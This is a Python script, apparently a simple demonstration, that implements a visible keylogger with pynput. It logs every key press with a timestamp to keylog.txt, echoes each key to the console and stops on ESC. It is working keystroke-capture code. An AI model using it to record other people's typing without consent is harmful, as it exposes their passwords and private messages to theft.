import pynput
from pynput import keyboard
import datetime
import os

class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.create_log_file()

    def create_log_file(self):
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w') as f:
                f.write(f"Keylog started at {datetime.datetime.now()}\n")
                f.write("="*50 + "\n")

    def on_key_press(self, key):
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if hasattr(key, 'char') and key.char is not None:
                key_data = key.char
            else:
                key_data = f"[{key.name}]"
            
            with open(self.log_file, 'a') as f:
                f.write(f"{timestamp}: {key_data}\n")
            
            print(f"Key pressed: {key_data}")
            
        except AttributeError:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.log_file, 'a') as f:
                f.write(f"{timestamp}: [SPECIAL_KEY: {key}]\n")
            print(f"Special key pressed: {key}")

    def on_key_release(self, key):
        if key == keyboard.Key.esc:
            print("Escape key pressed. Stopping keylogger...")
            return False

    def start_logging(self):
        print("Keylogger started. Press ESC to stop.")
        print(f"Logs are being saved to: {self.log_file}")
        
        with keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    try:
        keylogger.start_logging()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user.")
    except Exception as e:
        print(f"Error: {e}")